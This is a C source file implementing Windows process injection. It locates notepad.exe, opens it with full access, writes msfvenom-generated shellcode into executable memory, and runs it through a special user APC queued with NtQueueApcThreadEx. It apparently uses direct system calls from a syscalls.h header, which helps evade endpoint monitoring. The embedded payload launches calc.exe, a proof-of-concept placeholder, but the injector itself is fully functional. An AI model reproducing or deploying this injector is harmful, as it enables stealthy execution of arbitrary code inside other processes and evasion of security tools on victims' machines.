#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <processthreadsapi.h>
#include <memoryapi.h>s
#include "syscalls.h"

#define TARGET_PROCESS_NAME "notepad.exe"

DWORD find_process(char* process_name) {

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	for (Process32First(snapshot, &pe); Process32Next(snapshot, &pe);) {
		if (strcmp(pe.szExeFile, process_name) == 0) {
			CloseHandle(snapshot);
			return pe.th32ProcessID;
		}
	}

	CloseHandle(snapshot);
	return 0;
}

typedef enum _QUEUE_USER_APC_FLAGS {
	QueueUserApcFlagsNone,
	QueueUserApcFlagsSpecialUserApc,
	QueueUserApcFlagsMaxValue
} QUEUE_USER_APC_FLAGS;


typedef union _USER_APC_OPTION {
	ULONG_PTR UserApcFlags;
	HANDLE MemoryReserveHandle;
} USER_APC_OPTION, *PUSER_APC_OPTION;



//msfvenom -p windows/x64/exec cmd=calc.exe -f c
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

int main() {
	DWORD target_process_id = find_process(TARGET_PROCESS_NAME);
	printf("target process id is %d\n", target_process_id);

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID ci = { (HANDLE)target_process_id, NULL };

	HANDLE target_process_handle;
	LPVOID target_process_buffer = NULL;
	SIZE_T shellcode_len = sizeof(shellcode);


	NtOpenProcess(&target_process_handle, PROCESS_ALL_ACCESS, &oa, &ci);
	NtAllocateVirtualMemory(target_process_handle, &target_process_buffer, 0, &shellcode_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(target_process_handle, target_process_buffer, shellcode, shellcode_len, NULL);


	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	HANDLE target_thread_handle = NULL;
	CLIENT_ID thread_client_id;

	USER_APC_OPTION UserApcOption;
	UserApcOption.UserApcFlags = QueueUserApcFlagsSpecialUserApc;


	for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
		if (te.th32OwnerProcessID == target_process_id) {


			HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);

			NtQueueApcThreadEx(target_thread_handle, QueueUserApcFlagsSpecialUserApc, (PKNORMAL_ROUTINE)target_process_buffer, NULL, NULL, NULL);

			CloseHandle(target_thread_handle);
			break;

		}
	}

	CloseHandle(target_thread_handle);
	CloseHandle(snapshot);
	CloseHandle(target_process_handle);


	return 0;
}
